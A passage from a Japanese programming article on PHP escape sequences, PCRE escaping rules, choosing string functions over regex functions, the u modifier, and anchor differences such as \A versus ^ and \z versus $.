<table>
<thead>
<tr>
<th style="text-align: center">記述</th>
<th style="text-align: center">実際の表示</th>
<th style="text-align: center">意味</th>
<th style="text-align: center">備考</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align: center"><strong><code>\$</code></strong></td>
<td style="text-align: center">$</td>
<td style="text-align: center">ドル記号</td>
<td style="text-align: center">
<strong>【※2】</strong> 直後に変数名に使える文字がなければ省略可能</td>
</tr>
<tr>
<td style="text-align: center"><code>{$var}</code></td>
<td style="text-align: center">$var の値</td>
<td style="text-align: center">変数展開</td>
<td style="text-align: center"></td>
</tr>
<tr>
<td style="text-align: center"><code>$var</code></td>
<td style="text-align: center">$var の値</td>
<td style="text-align: center">変数展開</td>
<td style="text-align: center"></td>
</tr>
<tr>
<td style="text-align: center"><code>{$var[0]}</code></td>
<td style="text-align: center">$var[0] の値</td>
<td style="text-align: center">変数展開</td>
<td style="text-align: center"></td>
</tr>
<tr>
<td style="text-align: center"><code>$var[0]</code></td>
<td style="text-align: center">$var[0] の値</td>
<td style="text-align: center">変数展開</td>
<td style="text-align: center"></td>
</tr>
<tr>
<td style="text-align: center"><code>{$var['hoge']}</code></td>
<td style="text-align: center">$var['hoge'] の値</td>
<td style="text-align: center">変数展開</td>
<td style="text-align: center">↓ との違いに注意</td>
</tr>
<tr>
<td style="text-align: center"><code>$var[hoge]</code></td>
<td style="text-align: center">$var['hoge'] の値</td>
<td style="text-align: center">変数展開</td>
<td style="text-align: center">↑ との違いに注意</td>
</tr>
</tbody>
</table>

<h2>
<span id="nowdoc内で処理されるシーケンス" class="fragment"></span><a href="#nowdoc%E5%86%85%E3%81%A7%E5%87%A6%E7%90%86%E3%81%95%E3%82%8C%E3%82%8B%E3%82%B7%E3%83%BC%E3%82%B1%E3%83%B3%E3%82%B9"><i class="fa fa-link"></i></a>Nowdoc内で処理されるシーケンス</h2>

<p>無し</p>

<h1>
<span id="正規表現エンジンレベルでのエスケープシーケンス" class="fragment"></span><a href="#%E6%AD%A3%E8%A6%8F%E8%A1%A8%E7%8F%BE%E3%82%A8%E3%83%B3%E3%82%B8%E3%83%B3%E3%83%AC%E3%83%99%E3%83%AB%E3%81%A7%E3%81%AE%E3%82%A8%E3%82%B9%E3%82%B1%E3%83%BC%E3%83%97%E3%82%B7%E3%83%BC%E3%82%B1%E3%83%B3%E3%82%B9"><i class="fa fa-link"></i></a><strong>正規表現エンジンレベルでのエスケープシーケンス</strong>
</h1>

<p>大部分は <strong><a href="http://www.php.net/manual/ja/regexp.reference.escape.php" rel="nofollow noopener" target="_blank">マニュアル</a></strong> 通りなので私からの説明は割愛しますが、 <code>\ddd</code> の項目にかなりややこしいケースがあるので、ここだけ説明を入れておきます。</p>

<h2>
<span id="処理の順序" class="fragment"></span><a href="#%E5%87%A6%E7%90%86%E3%81%AE%E9%A0%86%E5%BA%8F"><i class="fa fa-link"></i></a>処理の順序</h2>

<ol>
<li>
<strong>2桁以下</strong> のとき、まず10進数として扱い、その番目のキャプチャサブパターンが存在するときはそれを意味する。<br>
<strong>1～99</strong> であって、<ins>0は該当しない</ins>。</li>
<li>2桁以下で1に該当しなかったとき、<ins>3桁に満たない分だけ頭から0埋めされる</ins>。</li>
<li>
<strong>0～7</strong> の数字が続く分だけ、8進数コードとして処理する。それ以降はその文字自身を表す。</li>
</ol>

<p><a href="https://camo.qiitausercontent.com/b6f2f6e463f0a7cab5a2f6e9f814e192086e9734/68747470733a2f2f71696974612d696d6167652d73746f72652e73332e616d617a6f6e6177732e636f6d2f302f32353036302f39646237373437612d636363332d616265642d386230382d3430393333366664636666302e706e67" target="_blank" rel="nofollow noopener"><img src="https://camo.qiitausercontent.com/b6f2f6e463f0a7cab5a2f6e9f814e192086e9734/68747470733a2f2f71696974612d696d6167652d73746f72652e73332e616d617a6f6e6177732e636f6d2f302f32353036302f39646237373437612d636363332d616265642d386230382d3430393333366664636666302e706e67" alt="ss (2013-08-10 at 05.01.04).png" data-canonical-src="https://qiita-image-store.s3.amazonaws.com/0/25060/9db7747a-ccc3-abed-8b08-409336fdcff0.png"></a></p>

<p>これホントにどうかと思うけど、上で述べたことには忠実に従ってるので…</p>

<h1>
<span id="エスケープ方法に関する注意" class="fragment"></span><a href="#%E3%82%A8%E3%82%B9%E3%82%B1%E3%83%BC%E3%83%97%E6%96%B9%E6%B3%95%E3%81%AB%E9%96%A2%E3%81%99%E3%82%8B%E6%B3%A8%E6%84%8F"><i class="fa fa-link"></i></a><strong>エスケープ方法に関する注意</strong>
</h1>

<h2>
<span id="エスケープは2段構え" class="fragment"></span><a href="#%E3%82%A8%E3%82%B9%E3%82%B1%E3%83%BC%E3%83%97%E3%81%AF2%E6%AE%B5%E6%A7%8B%E3%81%88"><i class="fa fa-link"></i></a>エスケープは2段構え</h2>

<p><strong>PHP言語レベルでのエスケープ</strong> と <strong>正規表現エンジンレベルでのエスケープ</strong> の2段構えとなっていることに十分に留意してください。</p>

<h3>
<span id="例1-バックスラッシュのエスケープ" class="fragment"></span><a href="#%E4%BE%8B1-%E3%83%90%E3%83%83%E3%82%AF%E3%82%B9%E3%83%A9%E3%83%83%E3%82%B7%E3%83%A5%E3%81%AE%E3%82%A8%E3%82%B9%E3%82%B1%E3%83%BC%E3%83%97"><i class="fa fa-link"></i></a>例1: バックスラッシュのエスケープ</h3>

<p><strong>1. PHPコードレベルで文字列が読み取られる</strong><br>
    第1引数は文字列 <strong><code>/\\/</code></strong> として扱われます。</p>

<p><strong>2. 正規表現エンジンレベルで文字列が読み取られる</strong><br>
    パターンは文字 *<em>\*</em> にマッチするものとなります。</p>

<div class="code-frame" data-lang="php">
<div class="code-lang"><span class="bold">例1：バックスラッシュにマッチさせたい場合のコード</span></div>
<div class="highlight"><pre><span></span><span class="nb">preg_match</span><span class="p">(</span><span class="s1">'/\\\\/'</span><span class="p">,</span> <span class="nv">$text</span><span class="p">);</span>
<span class="nb">preg_match</span><span class="p">(</span><span class="s1">'/\\\/'</span><span class="p">,</span> <span class="nv">$text</span><span class="p">);</span>
<span class="nb">preg_match</span><span class="p">(</span><span class="s2">"/</span><span class="se">\\\\</span><span class="s2">/"</span><span class="p">,</span> <span class="nv">$text</span><span class="p">);</span>
<span class="nb">preg_match</span><span class="p">(</span><span class="s2">"/</span><span class="se">\\</span><span class="s2">\/"</span><span class="p">,</span> <span class="nv">$text</span><span class="p">);</span>
</pre></div>
</div>

<h3>
<span id="例2-null文字のエスケープ" class="fragment"></span><a href="#%E4%BE%8B2-null%E6%96%87%E5%AD%97%E3%81%AE%E3%82%A8%E3%82%B9%E3%82%B1%E3%83%BC%E3%83%97"><i class="fa fa-link"></i></a>例2: NULL文字のエスケープ</h3>

<p><strong>1. PHPコードレベルで文字列が読み取られる</strong><br>
    第1引数は文字列 <strong><code>/\000/</code></strong> または <strong><code>/\00/</code></strong> または <strong><code>/\0/</code></strong> として扱われます。</p>

<p><strong>2. 正規表現エンジンレベルで文字列が読み取られる</strong><br>
    パターンは <strong>NULL文字</strong> にマッチするものとなります。</p>

<div class="code-frame" data-lang="php">
<div class="code-lang"><span class="bold">例2：NULL文字にマッチさせたい場合のコード</span></div>
<div class="highlight"><pre><span></span><span class="nb">preg_match</span><span class="p">(</span><span class="s1">'/\\000/'</span><span class="p">,</span> <span class="nv">$text</span><span class="p">);</span>
<span class="nb">preg_match</span><span class="p">(</span><span class="s1">'/\\00/'</span><span class="p">,</span> <span class="nv">$text</span><span class="p">);</span>
<span class="nb">preg_match</span><span class="p">(</span><span class="s1">'/\\0/'</span><span class="p">,</span> <span class="nv">$text</span><span class="p">);</span>
<span class="nb">preg_match</span><span class="p">(</span><span class="s1">'/\000/'</span><span class="p">,</span> <span class="nv">$text</span><span class="p">);</span>
<span class="nb">preg_match</span><span class="p">(</span><span class="s1">'/\00/'</span><span class="p">,</span> <span class="nv">$text</span><span class="p">);</span>
<span class="nb">preg_match</span><span class="p">(</span><span class="s1">'/\0/'</span><span class="p">,</span> <span class="nv">$text</span><span class="p">);</span>
<span class="nb">preg_match</span><span class="p">(</span><span class="s2">"/</span><span class="se">\\</span><span class="s2">000/"</span><span class="p">,</span> <span class="nv">$text</span><span class="p">);</span>
<span class="nb">preg_match</span><span class="p">(</span><span class="s2">"/</span><span class="se">\\</span><span class="s2">00/"</span><span class="p">,</span> <span class="nv">$text</span><span class="p">);</span>
<span class="nb">preg_match</span><span class="p">(</span><span class="s2">"/</span><span class="se">\\</span><span class="s2">0/"</span><span class="p">,</span> <span class="nv">$text</span><span class="p">);</span>
</pre></div>
</div>

<ins>PCRE正規表現関数は、パターンに関してはバイナリセーフでないので、NULL文字をそのまま渡すことが出来ません。</ins>

<table>
<thead>
<tr>
<th style="text-align: center"></th>
<th style="text-align: center">
<strong>PCRE</strong><br>(<a href="http://www.php.net/manual/ja/function.preg-match.php" rel="nofollow noopener" target="_blank">preg_match</a>)</th>
<th style="text-align: center">
<strong>鬼車</strong><br>(<a href="http://www.php.net/manual/ja/function.mb-ereg.php" rel="nofollow noopener" target="_blank">mb_ereg</a>)</th>
<th style="text-align: center">
<strong>POSIX</strong><br> (<a href="http://www.php.net/manual/ja/function.ereg.php" rel="nofollow noopener" target="_blank">ereg</a>)</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align: center">パターンはバイナリセーフか</td>
<td style="text-align: center">×</td>
<td style="text-align: center">○</td>
<td style="text-align: center">×</td>
</tr>
<tr>
<td style="text-align: center">検索対象文字列はバイナリセーフか</td>
<td style="text-align: center">○</td>
<td style="text-align: center">○</td>
<td style="text-align: center">×</td>
</tr>
</tbody>
</table>

<h2>
<span id="正規表現エンジンに対して無駄なエスケープは行わない" class="fragment"></span><a href="#%E6%AD%A3%E8%A6%8F%E8%A1%A8%E7%8F%BE%E3%82%A8%E3%83%B3%E3%82%B8%E3%83%B3%E3%81%AB%E5%AF%BE%E3%81%97%E3%81%A6%E7%84%A1%E9%A7%84%E3%81%AA%E3%82%A8%E3%82%B9%E3%82%B1%E3%83%BC%E3%83%97%E3%81%AF%E8%A1%8C%E3%82%8F%E3%81%AA%E3%81%84"><i class="fa fa-link"></i></a>正規表現エンジンに対して無駄なエスケープは行わない</h2>

<p>エスケープ不要な文字に関してエスケープをすることは可能な限り控えましょう。<br>
PHP言語レベルでの「省略可能」については、<br>
<strong>「本来エスケープしなければならないものをエスケープしなくても動く」</strong><br>
というニュアンスでしたが、こちらは逆に<br>
<strong>「本来エスケープしてはいけないものをエスケープしても動く」</strong><br>
という解釈になると思います。</p>

<p>特に <strong>文字クラス</strong> に関して冗長なエスケープをする人が数多く見られるので、エスケープが必要なものを列挙しておきます。</p>

<ul>
<li><strong><code>]</code></strong></li>
<li><strong><code>\</code></strong></li>
<li><strong><code>:</code></strong></li>
<li>
<strong><code>^</code></strong> <strong>(※先頭にくる場合のみ)</strong>
</li>
<li>
<code>/</code> (デリミタに使った文字)</li>
</ul>

<p>以上です。 <strong><code>[</code> や <code>-</code> の エスケープいらないの？</strong> って思う人も多いかもしれませんが、本当にこれだけです。先頭以外の <strong><code>^</code></strong> はエスケープ不要です。 <strong><code>-</code></strong> にマッチさせたい場合は、エスケープするのではなく、文字クラスの <strong>先頭</strong> か <strong>末尾</strong> に入れるのが正解です。<br>
　<br>
<strong>【重要な追記】</strong><br>
<ins>鬼車 (mb_ereg) の場合は</ins> <strong><code>[</code></strong> <ins>のエスケープが必要です。</ins></p>

<h1>
<span id="正規表現関数の選択に関する注意" class="fragment"></span><a href="#%E6%AD%A3%E8%A6%8F%E8%A1%A8%E7%8F%BE%E9%96%A2%E6%95%B0%E3%81%AE%E9%81%B8%E6%8A%9E%E3%81%AB%E9%96%A2%E3%81%99%E3%82%8B%E6%B3%A8%E6%84%8F"><i class="fa fa-link"></i></a><strong>正規表現関数の選択に関する注意</strong>
</h1>

<h2>
<span id="正規表現関数を使わずに実現できるかどうかを最初に検討する" class="fragment"></span><a href="#%E6%AD%A3%E8%A6%8F%E8%A1%A8%E7%8F%BE%E9%96%A2%E6%95%B0%E3%82%92%E4%BD%BF%E3%82%8F%E3%81%9A%E3%81%AB%E5%AE%9F%E7%8F%BE%E3%81%A7%E3%81%8D%E3%82%8B%E3%81%8B%E3%81%A9%E3%81%86%E3%81%8B%E3%82%92%E6%9C%80%E5%88%9D%E3%81%AB%E6%A4%9C%E8%A8%8E%E3%81%99%E3%82%8B"><i class="fa fa-link"></i></a>正規表現関数を使わずに実現できるかどうかを最初に検討する</h2>

<p>無意味に処理速度の遅い正規表現関数を使うのはやめましょう。</p>

<h3>
<span id="例1-文字列の検索" class="fragment"></span><a href="#%E4%BE%8B1-%E6%96%87%E5%AD%97%E5%88%97%E3%81%AE%E6%A4%9C%E7%B4%A2"><i class="fa fa-link"></i></a>例1: 文字列の検索</h3>

<p>正規表現の機能を利用していない単純な検索処理があります。</p>

<div class="code-frame" data-lang="php">
<div class="code-lang"><span class="bold">preg_match関数での実装</span></div>
<div class="highlight"><pre><span></span><span class="k">if</span> <span class="p">(</span><span class="nb">preg_match</span><span class="p">(</span><span class="s1">'/abc/'</span><span class="p">,</span> <span class="nv">$str</span><span class="p">))</span> <span class="p">{</span>
    <span class="k">echo</span> <span class="s1">'"abc" found.'</span><span class="p">;</span>
<span class="p">}</span>
</pre></div>
</div>

<p>この処理は <strong><a href="http://www.php.net/manual/ja/function.strpos.php" rel="nofollow noopener" target="_blank">strpos</a></strong> 関数で実現できます。</p>

<div class="code-frame" data-lang="php">
<div class="code-lang"><span class="bold">preg_match関数での実装</span></div>
<div class="highlight"><pre><span></span><span class="k">if</span> <span class="p">(</span><span class="nb">strpos</span><span class="p">(</span><span class="nv">$str</span><span class="p">,</span> <span class="s1">'abc'</span><span class="p">)</span> <span class="o">!==</span> <span class="k">false</span><span class="p">)</span> <span class="p">{</span>
    <span class="k">echo</span> <span class="s1">'"abc" found.'</span><span class="p">;</span>
<span class="p">}</span>
</pre></div>
</div>

<p>比較演算子に <code>!=</code> ではなく <code>!==</code> を用いていることに注意してください。ドキュメント上に警告があります。</p>

<p><a href="https://camo.qiitausercontent.com/b76d28fca86a8383fdb022d4ebfeb16d8b3c0ebd/68747470733a2f2f71696974612d696d6167652d73746f72652e73332e616d617a6f6e6177732e636f6d2f302f32353036302f33356439626565332d643833322d323861632d656365352d3765383037653062356261312e706e67" target="_blank" rel="nofollow noopener"><img src="https://camo.qiitausercontent.com/b76d28fca86a8383fdb022d4ebfeb16d8b3c0ebd/68747470733a2f2f71696974612d696d6167652d73746f72652e73332e616d617a6f6e6177732e636f6d2f302f32353036302f33356439626565332d643833322d323861632d656365352d3765383037653062356261312e706e67" alt="ss (2014-05-13 at 10.47.45).png" data-canonical-src="https://qiita-image-store.s3.amazonaws.com/0/25060/35d9bee3-d832-28ac-ece5-7e807e0b5ba1.png"></a></p>

<h3>
<span id="例2-文字列の削除" class="fragment"></span><a href="#%E4%BE%8B2-%E6%96%87%E5%AD%97%E5%88%97%E3%81%AE%E5%89%8A%E9%99%A4"><i class="fa fa-link"></i></a>例2: 文字列の削除</h3>

<p>改行コードをすべて削除する処理があります。</p>

<div class="code-frame" data-lang="php">
<div class="code-lang"><span class="bold">preg_replace関数での実装</span></div>
<div class="highlight"><pre><span></span><span class="nv">$str</span> <span class="o">=</span> <span class="nb">preg_replace</span><span class="p">(</span><span class="s2">"/[</span><span class="se">\r\n</span><span class="s2">]/"</span><span class="p">,</span> <span class="s1">''</span><span class="p">,</span> <span class="nv">$str</span><span class="p">);</span>
</pre></div>
</div>

<p>この処理は <strong><a href="http://www.php.net/manual/ja/function.str-replace.php" rel="nofollow noopener" target="_blank">str_replace</a></strong> 関数で実現できます。 <strong><a href="http://www.php.net/manual/ja/function.strtr.php" rel="nofollow noopener" target="_blank">strtr</a></strong> 関数でも実現できますが、処理速度は前者の方が高速です。</p>

<div class="code-frame" data-lang="php">
<div class="code-lang"><span class="bold">str_replace関数での実装</span></div>
<div class="highlight"><pre><span></span><span class="nv">$str</span> <span class="o">=</span> <span class="nb">str_replace</span><span class="p">(</span><span class="k">array</span><span class="p">(</span><span class="s2">"</span><span class="se">\r</span><span class="s2">"</span><span class="p">,</span> <span class="s2">"</span><span class="se">\n</span><span class="s2">"</span><span class="p">),</span> <span class="s1">''</span><span class="p">,</span> <span class="nv">$str</span><span class="p">);</span>
</pre></div>
</div>

<div class="code-frame" data-lang="php">
<div class="code-lang"><span class="bold">strtr関数での実装</span></div>
<div class="highlight"><pre><span></span><span class="nv">$str</span> <span class="o">=</span> <span class="nb">strtr</span><span class="p">(</span><span class="nv">$str</span><span class="p">,</span> <span class="nb">array_fill_keys</span><span class="p">(</span><span class="k">array</span><span class="p">(</span><span class="s2">"</span><span class="se">\r</span><span class="s2">"</span><span class="p">,</span> <span class="s2">"</span><span class="se">\n</span><span class="s2">"</span><span class="p">),</span> <span class="s1">''</span><span class="p">));</span>
</pre></div>
</div>

<h3>
<span id="例3-文字列の置換" class="fragment"></span><a href="#%E4%BE%8B3-%E6%96%87%E5%AD%97%E5%88%97%E3%81%AE%E7%BD%AE%E6%8F%9B"><i class="fa fa-link"></i></a>例3: 文字列の置換</h3>

<p>改行コードをすべてに <code>\r\n</code> に統一する処理があります。</p>

<div class="code-frame" data-lang="php">
<div class="code-lang"><span class="bold">preg_replace関数での実装</span></div>
<div class="highlight"><pre><span></span><span class="nv">$str</span> <span class="o">=</span> <span class="nb">preg_replace</span><span class="p">(</span><span class="s2">"/</span><span class="se">\r\n</span><span class="s2">|</span><span class="se">\r</span><span class="s2">|</span><span class="se">\n</span><span class="s2">/"</span><span class="p">,</span> <span class="s2">"</span><span class="se">\r\n</span><span class="s2">"</span><span class="p">,</span> <span class="nv">$str</span><span class="p">);</span>
</pre></div>
</div>

<p>この処理は <strong><a href="http://www.php.net/manual/ja/function.strtr.php" rel="nofollow noopener" target="_blank">strtr</a></strong> 関数で実現できます。</p>

<div class="code-frame" data-lang="php">
<div class="code-lang"><span class="bold">strtr関数での実装</span></div>
<div class="highlight"><pre><span></span><span class="nv">$str</span> <span class="o">=</span> <span class="nb">strtr</span><span class="p">(</span><span class="nv">$str</span><span class="p">,</span> <span class="nb">array_fill_keys</span><span class="p">(</span><span class="k">array</span><span class="p">(</span><span class="s2">"</span><span class="se">\r\n</span><span class="s2">"</span><span class="p">,</span> <span class="s2">"</span><span class="se">\r</span><span class="s2">"</span><span class="p">,</span> <span class="s2">"</span><span class="se">\n</span><span class="s2">"</span><span class="p">),</span> <span class="s2">"</span><span class="se">\r\n</span><span class="s2">"</span><span class="p">));</span>
</pre></div>
</div>

<p><strong><a href="http://www.php.net/manual/ja/function.str-replace.php" rel="nofollow noopener" target="_blank">str_replace</a></strong> 関数では実現できません。その理由はドキュメントにも強調的に書かれています。</p>

<p><a href="https://camo.qiitausercontent.com/4bb8191ab7e37ce089bbbc12554901d561badeca/68747470733a2f2f71696974612d696d6167652d73746f72652e73332e616d617a6f6e6177732e636f6d2f302f32353036302f39396436303461362d353066632d346336652d616133622d3538353431336561646430342e706e67" target="_blank" rel="nofollow noopener"><img src="https://camo.qiitausercontent.com/4bb8191ab7e37ce089bbbc12554901d561badeca/68747470733a2f2f71696974612d696d6167652d73746f72652e73332e616d617a6f6e6177732e636f6d2f302f32353036302f39396436303461362d353066632d346336652d616133622d3538353431336561646430342e706e67" alt="ss (2014-05-13 at 10.21.21).png" data-canonical-src="https://qiita-image-store.s3.amazonaws.com/0/25060/99d604a6-50fc-4c6e-aa3b-585413eadd04.png"></a></p>

<h3>
<span id="例4-マルチバイト文字列の置換" class="fragment"></span><a href="#%E4%BE%8B4-%E3%83%9E%E3%83%AB%E3%83%81%E3%83%90%E3%82%A4%E3%83%88%E6%96%87%E5%AD%97%E5%88%97%E3%81%AE%E7%BD%AE%E6%8F%9B"><i class="fa fa-link"></i></a>例4: マルチバイト文字列の置換</h3>

<p><strong><a href="http://www.php.net/manual/ja/function.str-replace.php" rel="nofollow noopener" target="_blank">str_replace</a></strong> 関数はマルチバイト文字列の検知に対応していませんが、 <code>UTF-8</code> を採用している場合は問題なく使用することが出来ます。</p>

<div class="code-frame" data-lang="php"><div class="highlight"><pre><span></span><span class="nv">$str</span> <span class="o">=</span> <span class="nb">str_replace</span><span class="p">(</span><span class="s2">"あいうえお"</span><span class="p">,</span> <span class="s2">"かきくけこ"</span><span class="p">,</span> <span class="nv">$str</span><span class="p">);</span>
</pre></div></div>

<p>その理由は <strong><a href="http://www.softel.co.jp/blogs/tech/archives/525" rel="nofollow noopener" target="_blank">「マルチバイト非対応関数で文字化け発生 str_replace() と mb_ereg_replace」</a></strong> で解説されています。 <code>ASCII</code> の上位互換コードと言われる <code>UTF-8</code> ならではの特性です。</p>

<h2>
<span id="split-関数はposix正規表現関数である" class="fragment"></span><a href="#split-%E9%96%A2%E6%95%B0%E3%81%AFposix%E6%AD%A3%E8%A6%8F%E8%A1%A8%E7%8F%BE%E9%96%A2%E6%95%B0%E3%81%A7%E3%81%82%E3%82%8B"><i class="fa fa-link"></i></a><strong><a href="http://www.php.net/manual/ja/function.split.php" rel="nofollow noopener" target="_blank">split</a></strong> 関数はPOSIX正規表現関数である</h2>

<p>どこにも <code>ereg</code> の文字が見当たらないので <strong>「文字列を指定した文字列で分割する関数」</strong> だと思い込む初心者さんが非常に多いのですが、これはPOSIX正規表現関数に該当します。本当に求められているのはこの関数ではなく <strong><a href="http://www.php.net/manual/ja/function.explode.php" rel="nofollow noopener" target="_blank">explode</a></strong> 関数です。</p>

<h2>
<span id="posix正規表現関数は全て非推奨関数である" class="fragment"></span><a href="#posix%E6%AD%A3%E8%A6%8F%E8%A1%A8%E7%8F%BE%E9%96%A2%E6%95%B0%E3%81%AF%E5%85%A8%E3%81%A6%E9%9D%9E%E6%8E%A8%E5%A5%A8%E9%96%A2%E6%95%B0%E3%81%A7%E3%81%82%E3%82%8B"><i class="fa fa-link"></i></a>POSIX正規表現関数は全て非推奨関数である</h2>

<p>POSIX正規表現関数は公式マニュアル上で <strong>非推奨</strong> であると警告されています。<ins>検索対象の文字列がバイナリセーフで無い</ins>という致命的な欠陥を抱えていることもあり、セキュリティ的に危険なのでこの関数は絶対に使わないでください。</p>

<h2>
<span id="utf-8-ならばpcre正規表現関数を使う" class="fragment"></span><a href="#utf-8-%E3%81%AA%E3%82%89%E3%81%B0pcre%E6%AD%A3%E8%A6%8F%E8%A1%A8%E7%8F%BE%E9%96%A2%E6%95%B0%E3%82%92%E4%BD%BF%E3%81%86"><i class="fa fa-link"></i></a><code>UTF-8</code> ならばPCRE正規表現関数を使う</h2>

<p>PCRE正規表現関数を使うか鬼車正規表現関数を使うか迷うところですが、前者で比較的利用機会の多い <strong><a href="http://www.php.net/manual/ja/function.preg-match-all.php" rel="nofollow noopener" target="_blank">preg_match_all</a></strong> 関数に相当する <strong>mb_ereg_all</strong> のような関数が後者では実装されていません。<code>UTF-8</code> であればどちらでもOKなので、特に理由がなければ前者を選択しておいた方が無難でしょう。</p>

<h1>
<span id="pcre正規表現関数の修飾子やメタ文字に関する注意" class="fragment"></span><a href="#pcre%E6%AD%A3%E8%A6%8F%E8%A1%A8%E7%8F%BE%E9%96%A2%E6%95%B0%E3%81%AE%E4%BF%AE%E9%A3%BE%E5%AD%90%E3%82%84%E3%83%A1%E3%82%BF%E6%96%87%E5%AD%97%E3%81%AB%E9%96%A2%E3%81%99%E3%82%8B%E6%B3%A8%E6%84%8F"><i class="fa fa-link"></i></a><strong>PCRE正規表現関数の修飾子やメタ文字に関する注意</strong>
</h1>

<h2>
<span id="u-修飾子を使用する目的" class="fragment"></span><a href="#u-%E4%BF%AE%E9%A3%BE%E5%AD%90%E3%82%92%E4%BD%BF%E7%94%A8%E3%81%99%E3%82%8B%E7%9B%AE%E7%9A%84"><i class="fa fa-link"></i></a><code>u</code> 修飾子を使用する目的</h2>

<p>PCRE正規表現関数でマッチングの単位を <strong>1バイト</strong> から <code>UTF-8</code> <strong>1文字</strong> に変更したい場合、 <code>u</code> 修飾子を利用しますが、必ずしもマルチバイト文字列を含むパターンを扱う際に必要だとは限りません。</p>

<h3>
<span id="不要な場合" class="fragment"></span><a href="#%E4%B8%8D%E8%A6%81%E3%81%AA%E5%A0%B4%E5%90%88"><i class="fa fa-link"></i></a>不要な場合</h3>

<div class="code-frame" data-lang="php"><div class="highlight"><pre><span></span><span class="nb">preg_match</span><span class="p">(</span><span class="s1">'/あ|い/u'</span><span class="p">,</span> <span class="nv">$str</span><span class="p">);</span>
</pre></div></div>

<ul>
<li>
<strong><code>u</code> 修飾子がある</strong><br>→ 文字列 <code>あ</code> または <code>い</code> にマッチ</li>
<li>
<strong><code>u</code> 修飾子がない</strong><br>→ バイト列 <code>E3</code> <code>81</code> <code>82</code> または <code>E3</code> <code>81</code> <code>84</code> にマッチ</li>
</ul>

<h3>
<span id="必要な場合" class="fragment"></span><a href="#%E5%BF%85%E8%A6%81%E3%81%AA%E5%A0%B4%E5%90%88"><i class="fa fa-link"></i></a>必要な場合</h3>

<div class="code-frame" data-lang="php"><div class="highlight"><pre><span></span><span class="nb">preg_match</span><span class="p">(</span><span class="s1">'/[あい]/u'</span><span class="p">,</span> <span class="nv">$str</span><span class="p">);</span>
</pre></div></div>

<ul>
<li>
<strong><code>u</code> 修飾子がある</strong><br>→ 文字 <code>あ</code> <code>い</code> のいずれかにマッチ</li>
<li>
<strong><code>u</code> 修飾子がない</strong><br>→ <ins>バイト <code>E3</code> <code>81</code> <code>82</code> <code>E3</code> <code>81</code> <code>84</code> のいずれかにマッチ</ins>
</li>
</ul>

<h2>
<span id="u-修飾子の副作用的効果" class="fragment"></span><a href="#u-%E4%BF%AE%E9%A3%BE%E5%AD%90%E3%81%AE%E5%89%AF%E4%BD%9C%E7%94%A8%E7%9A%84%E5%8A%B9%E6%9E%9C"><i class="fa fa-link"></i></a><code>u</code> 修飾子の副作用的効果</h2>

<ul>
<li>
<strong><a href="http://www.php.net/manual/ja/function.preg-match.php" rel="nofollow noopener" target="_blank">preg_match</a></strong> 関数または <strong><a href="http://www.php.net/manual/ja/function.preg-match-all.php" rel="nofollow noopener" target="_blank">preg_match_all</a></strong> 関数で <strong>不正なUTF-8シーケンス</strong> を検知したとき、返り値は <strong><code>FALSE</code></strong> になります。この性質を利用してエンコーディングバリデーションを行うことも出来ます。詳しくは <strong><a href="http://qiita.com/mpyw/items/f0628b35a368fa468775" id="reference-d7cc6f3bf754853ba2ba">「UTF-8を想定して、不正なバイト列が含まれていないかを1行でチェックする」</a></strong> で解説しています。</li>
<li>
<strong><a href="http://www.php.net/manual/ja/function.preg-match.php" rel="nofollow noopener" target="_blank">preg_replace</a></strong> 関数または <strong><a href="http://www.php.net/manual/ja/function.preg-match-all.php" rel="nofollow noopener" target="_blank">preg_replace_callback</a></strong> 関数で <strong>不正なUTF-8シーケンス</strong> を検知したとき、返り値は <strong><code>NULL</code></strong> になります。</li>
<li>
<strong><a href="http://www.php.net/manual/ja/function.preg-match.php" rel="nofollow noopener" target="_blank">preg_match</a></strong> 関数または <strong><a href="http://www.php.net/manual/ja/function.preg-match-all.php" rel="nofollow noopener" target="_blank">preg_match_all</a></strong> 関数で <strong><code>PREG_OFFSET_CAPTURE</code></strong> フラグを指定したとき、オフセットの単位が <strong>バイト</strong> から <strong>文字</strong> に変化します。</li>
</ul>

<h2>
<span id="-と-a---と-z-と-z-の違いを知る---" class="fragment"></span><a href="#-%E3%81%A8-a---%E3%81%A8-z-%E3%81%A8-z-%E3%81%AE%E9%81%95%E3%81%84%E3%82%92%E7%9F%A5%E3%82%8B---"><i class="fa fa-link"></i></a><code>^</code> と <code>\A</code> 、 <code>$</code> と <code>\Z</code> と <code>\z</code> の違いを知る   </h2>

<table>
<thead>
<tr>
<th style="text-align: center"></th>
<th style="text-align: center"><code>^</code></th>
<th style="text-align: center"><code>\A</code></th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align: center">通常時</td>
<td style="text-align: center">先頭にマッチ</td>
<td style="text-align: center">先頭にマッチ</td>
</tr>
<tr>
<td style="text-align: center">マルチラインモード(m修飾子)</td>
<td style="text-align: center">先頭または <strong>改行の直後</strong> にマッチ</td>
<td style="text-align: center">先頭にマッチ</td>
</tr>
</tbody>
</table>

<table>
<thead>
<tr>
<th style="text-align: center"></th>
<th style="text-align: center"><code>$</code></th>
<th style="text-align: center"><code>\Z</code></th>
<th style="text-align: center"><code>\z</code></th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align: center">通常時</td>
<td style="text-align: center">末尾または <strong>末尾の改行の直前</strong> にマッチ</td>
<td style="text-align: center">末尾または <strong>末尾の改行の直前</strong> にマッチ</td>
<td style="text-align: center">末尾にマッチ</td>
</tr>
<tr>
<td style="text-align: center">マルチラインモード(m修飾子)</td>
<td style="text-align: center">末尾または <strong>改行の直前</strong> にマッチ</td>
<td style="text-align: center">末尾または <strong>末尾の改行の直前</strong> にマッチ</td>
<td style="text-align: center">末尾にマッチ</td>
</tr>
</tbody>
</table>

<p>シビアな正規表現では <code>$</code> や  <code>\Z</code> は使うべきでないと思います。プログラミング言語によってこのあたりは若干変わってきますが、PHPではこのような実装となっています。</p>

<h2>
<span id="可能な限り最長マッチは独占的にする" class="fragment"></span><a href="#%E5%8F%AF%E8%83%BD%E3%81%AA%E9%99%90%E3%82%8A%E6%9C%80%E9%95%B7%E3%83%9E%E3%83%83%E3%83%81%E3%81%AF%E7%8B%AC%E5%8D%A0%E7%9A%84%E3%81%AB%E3%81%99%E3%82%8B"><i class="fa fa-link"></i></a>可能な限り最長マッチは独占的にする</h2>

<p>繰り返しパターンに関して、 <strong>最短マッチ</strong> , <strong>最長マッチ</strong> はご存じの人が多いと思いますが、 <strong>独占的最長マッチ</strong> の存在も忘れないでください。</p>

<table>
<thead>
